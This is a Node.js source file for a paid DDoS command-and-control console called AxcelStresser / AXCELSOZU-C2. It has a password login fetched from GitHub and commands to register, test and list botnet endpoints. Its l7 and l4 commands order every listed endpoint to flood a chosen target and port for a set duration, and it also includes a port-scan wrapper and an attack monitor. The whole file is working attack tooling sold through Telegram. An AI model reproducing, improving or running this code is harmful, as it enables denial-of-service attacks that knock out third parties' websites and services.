#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const net = require('net')
const gradient = require('gradient-string')
const version = '5.1.9'
let processList = [];
const Concurrents = '1/1'
const cyan = '\x1b[96m'
const teksputih = '\x1b[97m';
const bold = '\x1b[1m';
const back_putih = '\x1b[48;5;255m';
const teksmerah = '\x1b[31m';
const Reset = '\x1b[0m';
const biru = '\x1b[36m'
const hijau = '\x1b[38;2;144;238;144m'
const biruUnguMuda = '\x1b[38;2;173;150;255m';
const teks_hitam = '\x1b[30m'; // Teks hitam
const back_biru = '\x1b[44m'; // Latar belakang biru
const back_ungu = '\x1b[45m'; // Latar belakang ungu
const back_biru_ungu = '\x1b[48;2;128;0;255m';


const auren = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`${teksmerah}
\x1b[31m⠀⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⠀\x1b[0m
\x1b[31m⢾⣿⣿⣿⣿⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⣀⣴⣶⣿⣿⣿⣿⡇\x1b[0m
\x1b[31m⠈⢿⣿⣿⣿⡛⠛⠈⠳⣄⠂⠀⠀⠀⠀⠀⣠⠞⠉⠛⢻⣿⣿⣿⡟\x1b[0m⠀
\x1b[31m⠀⠸⣿⣿⣿⠥⠀⠀⠀⠈⢢⠀⠀⠀⠀⡜⠁⠀⠀⠀⢸⣿⣿⣿⠁\x1b[0m
\x1b[31m⠀⠀⣿⣿⣯⠭⠤⠀⠀⠀⠀⠃⣰⡄⠌⠀⠀⠀⠀⠨⢭⣿⣿⣿\x1b[0m⠀⠀       \x1b[97mAxcelStresser - C2 v2.2\x1b[0m
\x1b[31m⠀⠀⠹⢿⣿⣈⣀⣀⠀⠀⠠⢴⣿⣿⡦⠀⠀⠀⣀⣈⣱⣿⠿⠃\x1b[0m⠀⠀       \x1b[97mProvided by\x1b[0m \x1b[31mT.me/axcelsozu\x1b[0m
\x1b[31m⠀⠀⠀⢠⣾⣿⡟⠁⠀⠀⠀⠀⣿⣏⠀⠀⠀⠀⠘⣻⣿⣶\x1b[0m⠀⠀⠀⠀       \x1b[97mJoin our telegram channe\x1b[0ml \x1b[31mT.me/azcelsozu\x1b[0m
\x1b[31m⠀⠀⠀⢸⣿⣿⢂⠀⠀⠀⠀⠘⢸⡇⠆⠀⠀⠀⢀⠰⣿⣿\x1b[0m
\x1b[31m⠀⠀⠀⠈⣿⣷⣿⣆⡀⠀⠀⠁⠈⠀⠠⠀⠀⢀⣶⣿⣿⠏\x1b[0m⠀⠀⠀⠀       \x1b[97mType\x1b[0m \x1b[31m"help"\x1b[0m \x1b[97mto view available command\x1b[0m
\x1b[31m⠀⠀⠀⠀⠘⣿⣿⣿⣷⣴⡜⠀⠀⠀⠀⣦⣤⣾⣿⣿⡏\x1b[0m⠀⠀⠀⠀⠀       \x1b[97mType\x1b[0m \x1b[31m"methods"\x1b[0m \x1b[97mto view available methods\x1b[0m
\x1b[31m⠀⠀⠀⠀⢀⡿⠛⠿⠿⠛⠁⠀⠀⠀⠀⠘⠿⠿⠿⠿⢧\x1b[0m⠀⠀⠀⠀⠀
\x1b[31m⠀⠀⠀⠀⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣧\x1b[0m⠀⠀⠀⠀
\x1b[31m⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉\x1b[0m
\x1b[34m______________________________________________________________________________\x1b[0m
`)}
// [========================================] //
async function bootup() {
  try {
    // Clear the console screen first
    console.clear();
    
    // Display the banner
    console.log(`            
    \x1b[1m\x1b[31m
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⢄⣴⣾⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣤⣤⣤⣀⣀⣀⣀⣀⣀⣀⣶⡷⠋⣸⣾⣥⣤⣤⣤⣤⣤⣤⣤⣤⣤⡤
⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⡛⠛⠛⠛⠛⠛⠋⠀⠀⠛⠛⠛⠛⠛⠛⣻⣿⡿⠿⠛⠋⠁
⠀⠀⠀⠀⠀⠀⠀⠀⠹⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⣀⣠⣶⠶⠟⠋⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⠟⠃⠀⠀⠀⠀⣰⣤⠾⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⣾⠟⠁⣀⣴⣴⣆⠀⢀⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣠⣾⣟⣥⣶⡿⠟⠛⢷⣿⣷⣾⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣠⣿⣿⡿⠟⠋⠀⠀⠀⠀⠀⠻⣿⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⣠⠾⠛⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
${back_putih}${teksmerah} SELAMAT DATANG DAN SILAHKAN LOGIN${Reset}                                                                               
    `);

    // Fetch the password from the new URL
    const passwordResponse = await fetch('https://raw.githubusercontent.com/aurenstresser404/1a2u3r4e5n6p7a8s9s/main/ren.txt');
    const validPassword = await passwordResponse.text(); // Expected to get the password from the text

        // If for password
        auren.question(`${back_putih}${teksmerah}Password${Reset}: `, (password) => {
          if (password.trim() === validPassword.trim()) {
            // Successful login
            console.log(`Successfully Logged in!`);
            console.clear();
            console.log(`Welcome to ${biru}AXCELSOZU-C2${Reset} ${hijau}DDoS Tools!${Reset}${version}`);
            sleep(1000); // No need for await if sleep is synchronous
            banner();
            console.log(`Type ${hijau}"help"${Reset} for showing all available commands.`);
            sigma();
          } else {
            // Wrong password
            console.log(`makanya buy di @axcelsozu`);
            process.exit(-1);
          }
        });
  } catch (error) {
    console.log(`ampass jaringan lu`);
  }
}

async function scan(args) {
  if (args.length < 3) {
    console.log('Usage: scan <IP> [port awal] [port akhir]');
    sigma();
    return;
  }

  const [target, startPort, endPort] = args;

  try {
    console.clear();
    console.log(`Starting scan on ${target} ports ${startPort}-${endPort}...`);

    const scanFile = path.join(__dirname, 'scan.js');

    exec(`node ${scanFile} ${target} ${startPort} ${endPort}`, (err, stdout, stderr) => {
      if (err) {
        console.error(`Error: ${err.message}`);
        return;
      }
      if (stderr) console.error(stderr);

      // stdout berisi semua hasil scan dari scan.js
      console.log(stdout);

      sigma(); // panggil sigma() setelah scan selesai
    });

  } catch (error) {
    console.log(`Oops Something Went Wrong`);
    sigma();
  }
}
//===============fitur botnet via panel======L7======================\\
async function AttackBotnetL7(args) {
    if (args.length < 3) {
        console.log(`Example: l7 <target> <duration> <methods>
l7 http://google.com 443 120 flood`);
        sigma();
        return;
    }
    const [target, port, duration, methods] = args;
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        const result = scrape.data;
        let botnetData;
        let successCount = 0;
        const timeout = 20000;
        const validEndpoints = [];

        // Get current date and time
        const now = new Date();
        const currentDateTime = now.toLocaleString('id-ID', {
            timeZone: 'Asia/Jakarta',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
        });

        // Load botnet data
        try {
            botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Send requests to each endpoint
        const requests = botnetData.endpoints.map(async (endpoint) => {
            const apiUrl = `${endpoint}?target=${target}&port=${port}&time=${duration}&methods=${methods}`;

            try {
                const response = await axios.get(apiUrl, { timeout });
                if (response.status === 200) {
                    successCount++;
                    validEndpoints.push(endpoint);
                }
            } catch (error) {
                console.error(`Error sending request to ${endpoint}: ${error.message}`);
            }
        });

        await Promise.all(requests);

        // Save valid endpoints back to the file
        botnetData.endpoints = validEndpoints;
        try {
            fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            sigma();
        }

console.clear();
        console.log(`
${biruUnguMuda}("───────────────────────────────────────────────────────────────")
\x1b[34m𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐍𝐅𝐎𝐌𝐀𝐒𝐈𝐎𝐍:\x1b[0m
\x1b[31mDuration\x1b[0m  : ${duration}
\x1b[31mMethods\x1b[0m   : ${methods}
\x1b[31mTarget\x1b[0m    : ${target}
\x1b[31mPort\x1b[0m      : ${port} 
\x1b[31mConcurrents\x1b[0m: ${Concurrents}

\x1b[34m𝐓𝐀𝐑𝐆𝐄𝐓 𝐃𝐄𝐓𝐀𝐈𝐋:\x1b[0m
\x1b[31mAS\x1b[0m       : ${result.as}
\x1b[31mIp\x1b[0m       : ${result.query}
\x1b[31mISP\x1b[0m      : ${result.isp}
${biruUnguMuda}("───────────────────────────────────────────────────────────────")
${Reset}
`);
// Tambahkan di akhir AttackBotnetL7, sebelum sigma():
processList.push({
    target: target,
    port: port,
    startTime: Date.now(),
    endTime: Date.now() + parseInt(duration) * 1000,
    duration: parseInt(duration),
    methods: methods,
    type: 'L7'
});
        sigma();
    } catch (error) {
        console.error('Terjadi kesalahan:', error.message);
    }
}
// [========================================] //
//===============fitur botnet via panel======L4======================\\
async function AttackBotnetL4(args) {
    if (args.length < 3) {
    console.log(`Example: l4 <target> <duration> <methods>
l4 http://google.com 443 120 flood`);
    sigma();
	return
}
 const [target, port, duration, methods] = args;
    try {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];
    
    
    
        // Get current date and time
        const now = new Date();
        const currentDateTime = now.toLocaleString('id-ID', {
            timeZone: 'Asia/Jakarta',
            year: 'numeric',
            month: 'long',
            day: 'numeric',
            hour: '2-digit',
            minute: '2-digit',
            second: '2-digit',
        });

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=${target}&port=${port}&time=${duration}&methods=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma()
    }
console.clear();
    // Reply with the results
    console.log(`
${biruUnguMuda}("───────────────────────────────────────────────────────────────")
\x1b[34m𝐀𝐓𝐓𝐀𝐂𝐊 𝐈𝐍𝐅𝐎𝐌𝐀𝐒𝐈𝐎𝐍:\x1b[0m
\x1b[31mDuration\x1b[0m  : ${duration}
\x1b[31mMethods\x1b[0m   : ${methods}
\x1b[31mTarget\x1b[0m    : ${target}
\x1b[31mPort\x1b[0m      : ${port} 
\x1b[31mConcurrents\x1b[0m: ${Concurrents}
${biruUnguMuda}("───────────────────────────────────────────────────────────────")
${Reset}
`);
// Tambahkan di akhir AttackBotnetL7, sebelum sigma():
processList.push({
    target: target,
    port: port,
    startTime: Date.now(),
    endTime: Date.now() + parseInt(duration) * 1000,
    duration: parseInt(duration),
    methods: methods,
    type: 'L4'
});
    sigma()
    } catch (error) {
        console.error('Terjadi kesalahan:', error.message);
    }
}
//========================================================\\
async function monitorOngoingAttacks() {
    // Filter proses yang masih berjalan
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Tidak ada serangan yang sedang berlangsung.");
        sigma();
        return;
    }

    // Membuat tabel serangan
    let attackDetails = "\n=== Ongoing Attacks ===\n";
    attackDetails += `┌─────┬──────────────────────┬─────────┬──────────┬─────────┐\n`;
    attackDetails += `│  #  │        HOST          │ SINCE   │ DURATION │ METHOD  │\n`;
    attackDetails += `├─────┼──────────────────────┼─────────┼──────────┼─────────┤\n`;

    processList.forEach((process, index) => {
        const target = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000) + "s";
        const duration = Math.floor((process.endTime - process.startTime)/1000) + "s";

        attackDetails += `│ ${String(index + 1).padEnd(3)} │ ${target.padEnd(20)} │ ${since.padEnd(7)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} │\n`;
    });

    attackDetails += `└─────┴──────────────────────┴─────────┴──────────┴─────────┘\n`;

    console.log(attackDetails);
    sigma();
}
//===========================================\\
async function processBotnet(args) {
    if (args.length < 1) {
    console.log(`Example: addsrv <endpoints>
addsrv http://1.1.1.1:2000/ment`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/ment';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}
// [========================================] //
async function checkBotnet() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&port=443t&time=1&methods=stop`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`Checked endpoints. ${successCount} botnet endpoint(s) are online.`);
    sigma()
}
//===========================================\\
// Fungsi untuk menampilkan daftar API
async function listBotnet() {
    let botnetData;
    
    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Jika tidak ada endpoints
    if (botnetData.endpoints.length === 0) {
        console.log('No endpoints found in botnet.');
        sigma();
        return;
    }

    // Tampilkan daftar endpoint
    console.log('\x1b[1m\x1b[35m[====List of Botnet Endpoints====]\x1b[0m');
    botnetData.endpoints.forEach((endpoint, index) => {
        console.log(`${index + 1}. ${endpoint}. ${Reset}`);
    });
    console.log('────────────────────────────────');
     sigma();
}
//==========================================\\
async function sigma() {
const creatorCredits = `
TELE : @axcelsozu
`
const aurenprompt = `${gradient.morning("┌──(")}${hijau}("AXCELSOZU-C2")${gradient.morning(")-[~]")}
${gradient.morning("└─$")} ${Reset}`;
auren.question(aurenprompt, (input) => {
  const [command, ...args] = input.trim().split(/\s+/);
  // lanjut eksekusi command...

if (command === 'help') {
    console.log(`
[ methods ]   | view all methods
[ cls ]       | return to the home menu
[ l7 ]    | description of methods layer7
[ l4 ]    | description of methods layer4
[ addsrv ]     | to add a server
[ testsrv ]     | check active server
[ listsrv ]     | check how many servers there are
`);
    sigma();
  } else if (command === 'methods') {
  const methods = JSON.parse(fs.readFileSync('./methods.json', 'utf-8'));
  console.log('METHODS');

  methods.forEach(method => {
    console.log(`-${method.name} | ${method.description} | ${method.sts} `);
  });

  sigma();
    sigma();
  } else if (command === 'monitor') {
    monitorOngoingAttacks()
  } else if (command === 'cls') {
    banner()
    sigma()
  } else if (command === 'addsrv') {
    processBotnet(args)
  } else if (command === 'testsrv') {
    checkBotnet()
  } else if (command === 'listsrv') {
    listBotnet()
  } else if (command === 'l7') {
    AttackBotnetL7(args)
  } else if (command === 'l4') {
    AttackBotnetL4(args)
  } else if (command === 'scan') {
    scan(args)
  } else if (command === 'help') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()